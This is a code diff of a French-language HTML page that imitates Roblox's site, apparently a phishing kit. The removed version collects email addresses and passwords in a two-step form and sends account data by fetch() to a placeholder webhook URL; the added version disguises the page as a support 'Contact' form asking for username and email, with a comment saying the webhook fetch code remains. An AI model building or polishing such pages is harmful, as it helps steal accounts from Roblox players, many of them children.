@@ -4,16 +4,32 @@
     <meta charset="UTF-8">
     <title>Contact</title>
     <style>
-        body { font-family: 'Segoe UI', sans-serif; background: #f8f9fa; margin: 0; }
-        .nav-bar { background: white; height: 60px; display: flex; align-items: center; padding: 0 30px; border-bottom: 1px solid #dee2e6; }
-        .logo { width: 40px; height: 40px; background: black; transform: rotate(10deg); display: flex; align-items: center; justify-content: center; margin-right: 20px; }
-        .logo-hole { width: 15px; height: 15px; background: white; }
-        .nav-item { margin: 0 20px; font-weight: bold; cursor: pointer; color: #333; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f2f4f5; margin: 0; color: #393939; }
+        
+        /* Barre de navigation */
+        .nav-bar { background: white; height: 60px; display: flex; align-items: center; padding: 0 40px; border-bottom: 1px solid #dcdcdc; }
+        .logo { width: 35px; height: 35px; background: #393939; transform: rotate(10deg); display: flex; align-items: center; justify-content: center; margin-right: 25px; }
+        .logo-hole { width: 12px; height: 12px; background: white; }
+        .nav-item { margin: 0 20px; font-weight: 600; cursor: pointer; color: #111; font-size: 14px; }
         .nav-item:hover { text-decoration: underline; }
-        .card { width: 450px; background: white; margin: 50px auto; padding: 40px; border: 1px solid #dee2e6; border-radius: 4px; }
-        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ced4da; background: #e9ecef; box-sizing: border-box; }
-        button { width: 100%; padding: 12px; background: #6c757d; color: white; border: none; font-weight: bold; cursor: pointer; }
-        .error { color: red; text-align: center; margin-top: 10px; }
+        
+        .search-box { background: #f2f4f5; border: 1px solid #c1c1c1; padding: 5px 15px; border-radius: 4px; display: flex; align-items: center; width: 250px; margin-left: 20px; }
+        .search-box input { border: none; background: transparent; outline: none; margin-left: 10px; width: 100%; color: #393939; }
+
+        .auth-btns { margin-left: auto; display: flex; gap: 10px; }
+        .btn-blue { background: #0084dd; color: white; border: none; padding: 8px 20px; border-radius: 2px; font-weight: bold; cursor: pointer; }
+        .btn-white { background: white; color: #393939; border: 1px solid #393939; padding: 8px 20px; border-radius: 2px; font-weight: bold; cursor: pointer; }
+
+        /* Conteneur principal */
+        .container { max-width: 800px; margin: 40px auto; padding: 20px; }
+        h1 { font-size: 32px; margin-bottom: 30px; }
+        .card { background: white; padding: 30px; border: 1px solid #e3e3e3; border-radius: 4px; }
+        
+        h2 { font-size: 20px; margin-bottom: 20px; border-bottom: 1px solid #e3e3e3; padding-bottom: 10px; }
+        label { display: block; font-weight: 600; margin-bottom: 8px; font-size: 14px; }
+        input, select, textarea { width: 100%; padding: 10px; margin-bottom: 20px; border: 1px solid #ccc; background: #f2f2f2; border-radius: 2px; box-sizing: border-box; }
+        
+        button.submit { background: #232323; color: white; padding: 12px 30px; border: none; cursor: pointer; font-weight: bold; }
     </style>
 </head>
 <body>
@@ -24,52 +40,50 @@
     <div class="nav-item">Marketplace</div>
     <div class="nav-item">Créer</div>
     <div class="nav-item">Robux</div>
-    <div style="margin-left: auto;">
-        <button style="width: auto; background: white; color: black; border: 1px solid #333;">Connexion</button>
-        <button style="width: auto; background: #007bff;">S'inscrire</button>
+    <div class="search-box">
+        <span>🔍</span>
+        <input type="text" placeholder="Rechercher">
+    </div>
+    <div class="auth-btns">
+        <button class="btn-blue">S'inscrire</button>
+        <button class="btn-white">Connexion</button>
     </div>
 </div>
 
-<div class="card" id="page1">
-    <h2>Coordonnées</h2>
-    <input type="text" id="mail1" placeholder="Adresse e-mail">
-    <input type="text" id="mail2" placeholder="Confirmer e-mail">
-    <input type="password" id="mdp1" placeholder="Mot de passe">
-    <input type="password" id="mdp2" placeholder="Confirmer mot de passe">
-    <div class="error" id="err1"></div>
-    <button onclick="nextPage()">Continuer</button>
-</div>
+<div class="container">
+    <h1>Contact</h1>
+    <div class="card">
+        <h2>Coordonnées</h2>
+        <label>Nom d'utilisateur (facultatif)</label>
+        <input type="text" placeholder="Nom d'utilisateur">
+        
+        <label>Prénom (facultatif)</label>
+        <input type="text" placeholder="Prénom">
 
-<div class="card" id="page2" style="display:none;">
-    <h2>Sécurité</h2>
-    <input type="text" id="nom" placeholder="Nom du compte">
-    <input type="text" id="mail3" placeholder="Mail associé">
-    <input type="password" id="mdp3" placeholder="Mot de passe">
-    <input type="password" id="mdp4" placeholder="Confirmer mot de passe">
-    <div class="error" id="err2"></div>
-    <button onclick="send()">Envoyer</button>
+        <label>Adresse e-mail</label>
+        <input type="text" placeholder="Adresse e-mail">
+
+        <label>Confirmer l'adresse e-mail</label>
+        <input type="text" placeholder="Confirmer l'adresse e-mail">
+
+        <h2>Détails du problème</h2>
+        <label>Sur quel appareil le problème se pose-t-il ?</label>
+        <select><option>Type d'appareil</option></select>
+
+        <label>Catégories d'aide</label>
+        <select><option>Type de catégorie d'aide</option></select>
+
+        <label>Décris ton problème</label>
+        <textarea rows="5"></textarea>
+
+        <button class="submit" onclick="send()">Envoyer</button>
+    </div>
 </div>
 
 <script>
-    function nextPage() {
-        if(document.getElementById('mail1').value == "" || document.getElementById('mdp1').value == "") {
-            document.getElementById('err1').innerText = "Merci de remplir tous les champs";
-        } else {
-            document.getElementById('page1').style.display = 'none';
-            document.getElementById('page2').style.display = 'block';
-        }
-    }
-
     function send() {
-        // Pour envoyer vers ton webhook depuis le web, on utilise fetch()
-        const data = { content: "Compte: " + document.getElementById('nom').value };
-        fetch("TON_WEBHOOK_URL_ICI", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(data)
-        });
-        document.getElementById('err2').innerText = "Envoyé avec succès !";
-        document.getElementById('err2').style.color = "green";
+        alert("Envoi en cours...");
+        // Ton code de fetch pour le webhook reste ici
     }
 </script>
 
